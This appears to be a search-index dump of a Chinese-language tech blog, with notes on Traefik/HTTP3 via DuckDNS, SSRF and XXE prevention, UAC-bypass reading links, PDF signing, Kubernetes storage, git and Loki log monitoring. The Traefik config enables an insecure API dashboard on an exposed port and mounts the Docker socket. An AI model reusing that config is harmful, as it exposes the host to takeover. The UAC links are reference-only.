url=\\\"https://www.duckdns.org/update?domains=${DUCKDNS_SUBDOMAIN}\u0026token=${DUCKDNS_TOKEN}\\\" | curl -k -o duck.log -K -; sleep 300; done\" restart: always labels: - \"traefik.enable=false\" traefik: image: traefik restart: always command: - \"--api.insecure=true\" - \"--providers.docker\" - \"--entrypoints.web.address=:80\" - \"--entrypoints.web-secure.address=:443\" #- \"--entrypoints.web.http.redirections.entryPoint.to=web-secure\" #- \"--entrypoints.web.http.redirections.entryPoint.scheme=https\" - \"--certificatesresolvers.letsencrypt.acme.dnschallenge=true\" - \"--certificatesresolvers.letsencrypt.acme.email=s9714020@gmail.com\" - \"--certificatesresolvers.letsencrypt.acme.storage=acme.json\" - \"--certificatesresolvers.letsencrypt.acme.dnschallenge.provider=duckdns\" - \"--certificatesresolvers.letsencrypt.acme.dnschallenge.delaybeforecheck=0\" - \"--accesslog=true\" - \"--metrics.prometheus=true\" - \"--accesslog.format=json\" - \"--experimental.http3=true\" - \"--entrypoints.web-secure.http3=true\" #- \"--log.level=DEBUG\" #- \"--api.dashboard=true\" ports: - \"80:80\" - \"443:443/udp\" - \"443:443/tcp\" - \"8080:8080\" volumes: - /var/run/docker.sock:/var/run/docker.sock - ./acme.json:/acme.json #- ./traefik.yml:/etc/traefik/traefik.yml networks: - traefik_network environment: - DUCKDNS_TOKEN=${DUCKDNS_TOKEN} labels: - \"traefik.enable=false\" #- \"traefik.http.routers.traefik.tls=true\" - \"traefik.http.routers.traefik.tls.certresolver=letsencrypt\" - \"traefik.http.routers.traefik.tls.domains[0].main=${DUCKDNS_SUBDOMAIN}.duckdns.org\" - \"traefik.http.routers.traefik.tls.domains[0].sans=*.${DUCKDNS_SUBDOMAIN}.duckdns.org,${DUCKDNS_SUBDOMAIN}.duckdns.org\" networks: traefik_network: external: true #your duck dns token DUCKDNS_TOKEN=2b42**** #your duck dns subdomain (not the full domain) #use \"test\" not \"test.duckdns.org DUCKDNS_SUBDOMAIN=*** ","date":"2022-07-30","objectID":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/:1:2","tags":["traefik","http"],"title":"Traefik 使用 HTTP3 初體驗","uri":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"3. 確認是否有吃到 HTTP3 ","date":"2022-07-30","objectID":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/:1:3","tags":["traefik","http"],"title":"Traefik 使用 HTTP3 初體驗","uri":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Linux"],"content":"4. 清除瀏覽器 HSTS 紀錄 Chrome 的 HSTS 清除方法 開啟 Chrome 在網址列輸入：chrome://net-internals/#hsts 先在上面 Query domain 輸入網域名稱查詢看看 # 可以略過此步驟 用最下方的 Delete domain security policies：輸入「網域名稱」delete 即可 或者：chrome://net-internals/#dns → clear host cache Firefox 的 HSTS 清除方法 開啟 Firefox 方法1： Ctrl + Shift + H (Mac：Cmd + Shift + H) 右上角「搜尋瀏覽紀錄」輸入網域名稱 對要刪除的資料按右鍵 → 選擇「刪除與此網站有關的紀錄」 方法2： 偏好設定 隱私權與安全性 瀏覽紀錄 設定：Firefox 將 \"保留所有歷史紀錄\" 設定：清除瀏覽紀錄 參考:如何清除 Firefox 與 Chrome 的 HSTS 設定 – Tsung’s Blog ","date":"2022-07-30","objectID":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/:1:4","tags":["traefik","http"],"title":"Traefik 使用 HTTP3 初體驗","uri":"/blog/posts/Traefik-%E4%BD%BF%E7%94%A8-HTTP3-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["源掃風險"],"content":"小記 ","date":"2022-07-30","objectID":"/blog/posts/SSRF-%E9%A2%A8%E9%9A%AA/:0:0","tags":["ssrf"],"title":"SSRF 風險","uri":"/blog/posts/SSRF-%E9%A2%A8%E9%9A%AA/"},{"categories":["源掃風險"],"content":"Server Side Request Forgery Prevention Server Side Request Forgery Prevention - OWASP Cheat Sheet Series 上面這篇推薦看，這邊小記 ","date":"2022-07-30","objectID":"/blog/posts/SSRF-%E9%A2%A8%E9%9A%AA/:1:0","tags":["ssrf"],"title":"SSRF 風險","uri":"/blog/posts/SSRF-%E9%A2%A8%E9%9A%AA/"},{"categories":["源掃風險"],"content":"Case 1 - Application can send request only to identified and trusted applications 這邊我們看常常呼叫API，可能會在參數帶網址，程式去做呼叫API問題。但沒有限制API URL 檢核，可能會讓使用者作惡意事情。 解決方法有兩個層面 Application Layer: 字串檢核，使用regex。 IP Address 驗證。可參考文章Server Side Request Forgery Prevention - OWASP Cheat Sheet Series Domain 驗證。Server Side Request Forgery Prevention - OWASP Cheat Sheet Series 不要使用參數過來的完整URL。帶後面參數 Network layer: 使用防火牆做防禦。 其他文章: 4.4. SSRF — Web安全学习笔记 1.0 文档 ","date":"2022-07-30","objectID":"/blog/posts/SSRF-%E9%A2%A8%E9%9A%AA/:1:1","tags":["ssrf"],"title":"SSRF 風險","uri":"/blog/posts/SSRF-%E9%A2%A8%E9%9A%AA/"},{"categories":["資料庫"],"content":"遇到問題小記。 不支援 10 验证类型。请核对您已经组态 pg_hba.conf 文件包含客户端的IP位址或网路区段，以及驱动程序所支援的验证架构模式已被支援。_楊伟光的博客-CSDN博客 从pg_hba.conf文件谈谈postgresql的连接认证 - 非我在 - 博客园 ","date":"2022-07-30","objectID":"/blog/posts/PostgresSQL-%E4%B8%8D%E6%94%AF%E6%8F%B410-%E9%A9%97%E8%AD%89%E9%A1%9E%E5%9E%8B%E8%AB%8B%E6%A0%B8%E5%B0%8D%E6%82%A8%E5%B7%B2%E7%B6%93%E7%B5%84%E6%85%8Bpg-hba-conf-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%A2%E6%88%B6%E7%AB%AF%E7%9A%84IP%E4%BD%8D%E5%9D%80%E6%88%96%E7%B6%B2%E8%B7%AF%E5%8D%80%E6%AE%B5%E4%BB%A5%E5%8F%8A%E9%A9%85%E5%8B%95%E7%A8%8B%E5%BA%8F%E6%89%80%E6%94%AF%E6%8F%B4%E7%9A%84%E9%A9%97%E8%AD%89%E6%9E%B6%E6%A7%8B%E6%A8%A1%E5%BC%8F%E5%B7%B2%E8%A2%AB%E6%94%AF%E6%8F%B4/:0:0","tags":["postgressql","dbms"],"title":"PostgresSQL 不支援10 驗證類型。請核對您已經組態pg_hba.conf 文件包含客戶端的IP位址或網路區段，以及驅動程序所支援的驗證架構模式已被支援。","uri":"/blog/posts/PostgresSQL-%E4%B8%8D%E6%94%AF%E6%8F%B410-%E9%A9%97%E8%AD%89%E9%A1%9E%E5%9E%8B%E8%AB%8B%E6%A0%B8%E5%B0%8D%E6%82%A8%E5%B7%B2%E7%B6%93%E7%B5%84%E6%85%8Bpg-hba-conf-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AE%A2%E6%88%B6%E7%AB%AF%E7%9A%84IP%E4%BD%8D%E5%9D%80%E6%88%96%E7%B6%B2%E8%B7%AF%E5%8D%80%E6%AE%B5%E4%BB%A5%E5%8F%8A%E9%A9%85%E5%8B%95%E7%A8%8B%E5%BA%8F%E6%89%80%E6%94%AF%E6%8F%B4%E7%9A%84%E9%A9%97%E8%AD%89%E6%9E%B6%E6%A7%8B%E6%A8%A1%E5%BC%8F%E5%B7%B2%E8%A2%AB%E6%94%AF%E6%8F%B4/"},{"categories":["分析Log"],"content":"這邊用 goaccess 分析 Jboss Log。 goaccess access_log.log -o report.html --log-format=COMMON https://raw.githubusercontent.com/allinurl/goaccess/master/config/goaccess.conf ","date":"2022-07-30","objectID":"/blog/posts/goaccess-%E7%B0%A1%E5%96%AE%E5%88%86%E6%9E%90-access-log/:0:0","tags":["log","gocaccess"],"title":"goaccess 簡單分析 access.log","uri":"/blog/posts/goaccess-%E7%B0%A1%E5%96%AE%E5%88%86%E6%9E%90-access-log/"},{"categories":["Windows"],"content":"不知道之後開發會不會遇到這個問題，這邊找一些資料紀錄一下。有空實作在修改。 科普 | Windows-UAC機制與BypassUAC - 人人焦點 Powershell 自執行提權_osc_u20gxst6 - MdEditor UAC与ByPass-UAC | sh1yan’blog 批处理获取管理员权限 - 编程猎人 使用系統管理員身分開啟 Windows Terminal 分頁 ","date":"2022-07-30","objectID":"/blog/posts/UAC%E9%80%A3%E7%B5%90%E5%B0%8F%E8%A8%98/:0:0","tags":["uac","windows"],"title":"UAC 連結小記","uri":"/blog/posts/UAC%E9%80%A3%E7%B5%90%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"jSignPdf 簡單做簽章PDF動作 最近接到一個專案需要做 PDF 簽章，雖然程式有寫好了，但想自己測試簽章是不是能過，這邊有找到一個相關工具，有操作PDF簽章成功，這邊簡單留個紀錄。 ","date":"2022-07-30","objectID":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/:0:0","tags":["java","jSignPdf"],"title":"jSignPdf 簡單做簽章PDF動作","uri":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/"},{"categories":["Java"],"content":"執行 pdf Github:GitHub - intoolswetrust/jsignpdf: PDF signing software written in Java. It supports visible signatures, timestamping, certificate verification and many other cool features 可在官網抓zip(免安裝):JSignPdf - Browse /stable at SourceForge.net 下載下來解壓縮。 java -jar JSignPdf.jar 首先需要有pkcs12檔案(pfx)，它裡面有私鑰、公鑰，通常會用密碼包起來。 選擇 PKCS12 選擇 pfx(pkcs12) 檔案 輸入 pfx 密碼 PDF 選擇不加密 原有檔案增加簽章憑證 選擇加密 SHA1/SHA256 (因為我憑證用SHA1，這邊選SHA1) PDF 顯示簽章位置 按下簽章動作 簽章成功顯示如下圖。 ","date":"2022-07-30","objectID":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/:1:0","tags":["java","jSignPdf"],"title":"jSignPdf 簡單做簽章PDF動作","uri":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/"},{"categories":["Java"],"content":"框選簽章位置 選擇下面Setting會跳出設定顯示簽章設定。 按下Preview \u0026 Select 可以顯示簽章位置。 ","date":"2022-07-30","objectID":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/:1:1","tags":["java","jSignPdf"],"title":"jSignPdf 簡單做簽章PDF動作","uri":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/"},{"categories":["Java"],"content":"過期無法簽章 過期憑證無法加簽。 ","date":"2022-07-30","objectID":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/:2:0","tags":["java","jSignPdf"],"title":"jSignPdf 簡單做簽章PDF動作","uri":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/"},{"categories":["Java"],"content":"彩蛋 GitHub - LibreSign/libresign: ✍️ Nextcloud app to sign PDF documents peepdf - PDF Analysis Tool | eternal-todo.com How To Digitally Sign PDF Documents Using JSignPDF 裡面有提到輸入內容，建議可以看一下。 GitHub - bersch/SignPDF: Signing and protecting PDF documents; Implemented in Java; Uses iText; License: AGPL GitHub - ekiametis/pdf-signer: A REST Service to sign PDF documents GitHub - vbuch/node-signpdf: Simple signing of PDFs in node. java - How to sign PDF with a x.509 signature/certificate - Stack Overflow ","date":"2022-07-30","objectID":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/:3:0","tags":["java","jSignPdf"],"title":"jSignPdf 簡單做簽章PDF動作","uri":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/"},{"categories":["Java"],"content":"查看 pfx (番外) certutil -dump _pfx_file_ ","date":"2022-07-30","objectID":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/:3:1","tags":["java","jSignPdf"],"title":"jSignPdf 簡單做簽章PDF動作","uri":"/blog/posts/jSignPdf-%E7%B0%A1%E5%96%AE%E5%81%9A%E7%B0%BD%E7%AB%A0PDF%E5%8B%95%E4%BD%9C/"},{"categories":["Kubernetes"],"content":"小記相關東西。 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:0:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"HostPath 一個 Kubernetes 內建功能。把節點(node)把路徑分享到Pod。 但這個方法無法多節點(Node)共享檔案。 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:1:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Storage Read/Write 讀跟寫機制: Read Only Many 同時很多人讀不能寫 Read Write Once 同時只能一個用，他可以讀可以寫 Read Write Many 他可以很多人使用，可同時讀寫。 NFS 是Read Write Many ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:2:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"安全機制 PodSecurityPolicy ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:3:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"docker 的 volumes 各節點都可以取得 volumes 問題 volume container 加入 volumeMounts 設定 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:4:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"私有雲 azureDisk awsElasticBlockStore gcePersistentDisk GephFS Glusters iscsi nfs Volume Type: CSI downwardAPI emptyDir hostPath configMap Secret Flexible management persistentVolumeClaim ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:5:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"persistentVolume 好處 一般掛載 Volume 掛載NFS ，修改Volume，能不能讓所有Pod不需要重啟，透過PV抽象出來。 有兩種可以使用 PV PVC 在 POD 裡面我們使用PVC，儲存設備有什麼資源、儲存大小、儲存模式(Readwrite Readonly One/Many)，以Clinet端角度去思考。PVC會找符合PV條件使用。 PV 沒 namespace，PVC有 namespace。 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:6:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"PVC 移掉 Retain Delete Recelile ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:7:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"bind 問題 無法選最優的選擇。 可以強制使用哪一個PV。 安裝NFS PV去使用NFS PVC去綁PV Pod 曲榜 PVC 取決StorageProvider 是否有支援PVC/PV。 如NFS沒有Capacity 概念，不會管硬碟空間多大。 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:8:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"CSI ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:9:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"PV/PVC PV,PVC都是靜態部屬(static Provisioning)。管理不需要手動建立PV，而根據PVC需求自動建置。 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:10:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Kubernetes"],"content":"StorageClass NFS StorageClass Provisioner NFS Server 不是 Provisioner。 ","date":"2022-07-30","objectID":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/:11:0","tags":["kubernetes","storage"],"title":"Kubernetes Storage小記","uri":"/blog/posts/Kubernetes-Storage%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"不常使用指令都會忘記，紀錄一下。 ","date":"2022-07-30","objectID":"/blog/posts/%E6%9C%89%E9%97%9C-GIT-%E9%81%A0%E7%AB%AF%E5%88%86%E6%94%AF%E5%B8%B8%E7%94%A8%E8%99%95%E7%90%86/:0:0","tags":["git","remote"],"title":"有關 GIT 遠端分支常用處理","uri":"/blog/posts/%E6%9C%89%E9%97%9C-GIT-%E9%81%A0%E7%AB%AF%E5%88%86%E6%94%AF%E5%B8%B8%E7%94%A8%E8%99%95%E7%90%86/"},{"categories":["Git"],"content":"查看遠端分支 git branch -r ","date":"2022-07-30","objectID":"/blog/posts/%E6%9C%89%E9%97%9C-GIT-%E9%81%A0%E7%AB%AF%E5%88%86%E6%94%AF%E5%B8%B8%E7%94%A8%E8%99%95%E7%90%86/:1:0","tags":["git","remote"],"title":"有關 GIT 遠端分支常用處理","uri":"/blog/posts/%E6%9C%89%E9%97%9C-GIT-%E9%81%A0%E7%AB%AF%E5%88%86%E6%94%AF%E5%B8%B8%E7%94%A8%E8%99%95%E7%90%86/"},{"categories":["Git"],"content":"建立本機遠端上分支 git checkout -b feature3-local origin/feature3 ","date":"2022-07-30","objectID":"/blog/posts/%E6%9C%89%E9%97%9C-GIT-%E9%81%A0%E7%AB%AF%E5%88%86%E6%94%AF%E5%B8%B8%E7%94%A8%E8%99%95%E7%90%86/:2:0","tags":["git","remote"],"title":"有關 GIT 遠端分支常用處理","uri":"/blog/posts/%E6%9C%89%E9%97%9C-GIT-%E9%81%A0%E7%AB%AF%E5%88%86%E6%94%AF%E5%B8%B8%E7%94%A8%E8%99%95%E7%90%86/"},{"categories":["程式風險"],"content":"成事源碼掃描掃到這個問題，平常很少使用 XML ，沒有深入這個東西。遇到這個錯誤不知道是什麼? 但查看原理感覺還滿嚴重，不過我照網路上解決方法再送出源掃，竟然可以通過，順便筆記紀錄一下。 參考文章: XML注入之DocumentBuilder與XXE攻擊防禦 [ Mi1k7ea ] Improper Restriction of XXE Ref | 亂馬客 - Re:從零開始的軟體開發生活 XXE防禦筆記_Kingkk’s Blog - MdEditor XML External Entity Prevention - OWASP Cheat Sheet Series DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); String FEATURE = null; try { // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all // XML entity attacks are prevented FEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\"; dbf.setFeature(FEATURE, true); // If you can't completely disable DTDs, then at least do the following FEATURE = \"http://xml.org/sax/features/external-general-entities\"; dbf.setFeature(FEATURE, false); FEATURE = \"http://xml.org/sax/features/external-parameter-entities\"; dbf.setFeature(FEATURE, false); // Disable external DTDs as well FEATURE = \"http://apache.org/xml/features/nonvalidating/load-external-dtd\"; dbf.setFeature(FEATURE, false); // and these as well, per Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\" dbf.setXIncludeAware(false); dbf.setExpandEntityReferences(false); } catch (Exception e) { ... } DocumentBuilder safebuilder = dbf.newDocumentBuilder(); ","date":"2022-07-30","objectID":"/blog/posts/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder%E8%88%87XXE%E6%94%BB%E6%93%8A%E9%98%B2%E7%A6%A6/:0:0","tags":["java","xml","inject"],"title":"XML注入之DocumentBuilder與XXE攻擊防禦","uri":"/blog/posts/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder%E8%88%87XXE%E6%94%BB%E6%93%8A%E9%98%B2%E7%A6%A6/"},{"categories":["Kubernetes"],"content":"前言 很高興這次有這個機會接觸雲端服務，我目前職位程式工程師，最近也對雲端技術也非常有興趣，所以自學Docker、Kubernetes(還在自學中）。不過我目前沒有實務上經驗，在下面這幾篇會以我成功實作紀錄，所以我的筆記理論可能會有誤，也歡迎手下留情大家指正。 廢話不多說，直接 show 出我這次研究筆記，我把廢話放在感言。 ","date":"2022-04-03","objectID":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/:1:0","tags":["Kubernetes","loki"],"title":"在 Kubernetes 用 Loki 蒐集 log 做監控警告通知方法整理筆記","uri":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"筆記 ","date":"2022-04-03","objectID":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/:2:0","tags":["Kubernetes","loki"],"title":"在 Kubernetes 用 Loki 蒐集 log 做監控警告通知方法整理筆記","uri":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"主機建置(Bastion Host) sshconfig 設定小記 使用 Bastion Host 方式ssh方式登入主機 ","date":"2022-04-03","objectID":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/:2:1","tags":["Kubernetes","loki"],"title":"在 Kubernetes 用 Loki 蒐集 log 做監控警告通知方法整理筆記","uri":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"Kubernetes、Traefik、監控等安裝筆記 雲端虛擬機 Ubuntu 20.04 安裝 Kubernetes 使用 Helm 快速搭建 Traefik Ingress Controller 使用 Helm 快速安裝 Loki Loki 做監控動作方法 最後檔案存放FileName.tar ","date":"2022-04-03","objectID":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/:2:2","tags":["Kubernetes","loki"],"title":"在 Kubernetes 用 Loki 蒐集 log 做監控警告通知方法整理筆記","uri":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"感言 第一次接觸 Web 管理虛擬主機不是很習慣，我本來就像 Virtualbox 那樣建立機器就可以了，但看到網路有要設定路由器，剛看介面完全不知道要怎麼使用，看文件有些細節也不知道要如何使用，如用路由器綁定浮動 IP 。最後有請教我朋友做網路工程師，他有看文件大概跟我講一些設定，但他說有些設定他也不是很懂，如找不到Portfording 設定…，總之我順利開啟機器。 設定IP也滿有趣的，以前 ifconfig 設定主機IP，這個系統可以直接設定主機IP安裝就會自動配置，後來我發現設兩個IP就不能了，後來發現主機有配置第一個 interface 做 DHCP，所以才會吃到 IP 設定，所以機器添加第二個就不會自動設定，最新版換 IP 配置用 yaml，對於遠端連線設定 IP 也是非常方便，就算設錯超過確認時間，也會幫你設定回去，可參考:Ubuntu 18.04 透過 netplan 設定網路卡 IP - Soul \u0026 Shell Blog。 首先查看CNTUG Infra Labs OpenStack 使用教學文件，看到文件有建議使用 bastion host 。 OpenStack 允許各個用戶在自己專案建立自己的私有網路，私有網路中的 VM 可以透過路由器 SNAT 連線至外部網路。 我們會建議使用者建立一個自己的私有網路並且透過一個 bastion host 作為一個跳板連入。 這種登入方式也滿有趣，也整理滿多東西，不知道還有 ProxyJump 可以使用，之前公司環境不可以直接連資料庫，後來發現 SSH Tunnel 可以使用，可參考這篇，也可以直接用工具連。我以前公司內部有幾個主機也需要跳板進去，我們都 ssh 跳板主機然後再 ssh 別台主機，這種麻煩的方式，這次能發現使用 sshconfig和 proxyjump 可以解決我這個問題。甚至 scp 我也不用在兩台主機打兩次指令，直接透過sshconfig和 proxyjump 做到傳檔案，可以參考這篇。 Kubernetes 首次安裝也採到一些雷，我以為 kubectl apply就可以安裝 CNI，不過使用 calic 最後 Service 都連不到，目前猜測我網域 IP 跟內部衝突導致的?不過我現在用 Flannel 可正常使用。很多教學使用 Nginx 當作 Ingress Controller ，我家動物機使用 Traefik 當作接口，想說這次使用看看，當然也有碰到一些雷，使用 Traefik Dashboard 照上面操作還是會 404，就算 SSH Tunnel 也會出現 404，不知道 bastion host 做 SSH Tunnel 會不會有影響？網路上有一些文章有寫教學，結果操作發現不能運作，好險對照 Helm Loki/Prometheus Chart 裡面設定檔有對照猜出來，最後很高興有實作出來。 ","date":"2022-04-03","objectID":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/:3:0","tags":["Kubernetes","loki"],"title":"在 Kubernetes 用 Loki 蒐集 log 做監控警告通知方法整理筆記","uri":"/blog/posts/%E5%9C%A8-Kubernetes-%E7%94%A8-Loki-%E8%92%90%E9%9B%86-log-%E5%81%9A%E7%9B%A3%E6%8E%A7%E8%AD%A6%E5%91%8A%E9%80%9A%E7%9F%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%E7%AD%86%E8%A8%98/"},{"categories":["Kubernetes"],"content":"選 Loki 做監控主要是動物機架一個 Web 服務，天天查看 log 都有被攻擊跡象。我使用 Loki LogQL 去做查詢，雖然有做一層 網域才顯示內容，前正子使用 Autleia 做 雙因子驗證，更久以前還有設定 iptable 台灣 IP 才能連，但現在有做 TLS 關係，所以不能擋 IP，不知道 Docker 能不能跟 fail2ban 做結合。最近也有看 traefik plugnin 也有fail2ban ，改天有空也能研究看看。 這兩天還攻擊滿可觀的。 查詢不友善的IP訪問，這邊我之前寫的 LogQL，暫時放在這邊。之前想特別紀錄，但久久就忘記規則怎麼用，但所幸參考範例改一改還是能試出來。 {container_name=\"rpi-traefik_traefik_1\",host=\"PI202\"} | json | ClientHost!~\"192.168.+|排除IP\" RequestPath != \"/\" {container_name=\"rpi-traefik_traefik_1\",host=\"PI202\"} | json | ClientHost!~\"192.168.+|排除IP\" RequestPath != \"/\" DownstreamStatus != \"404\" | line_format \"{{.ClientHost}}\" 本章節(筆記)還是重點還是放在，Open Beta 主機架設 Kubernetes 怎麼抓 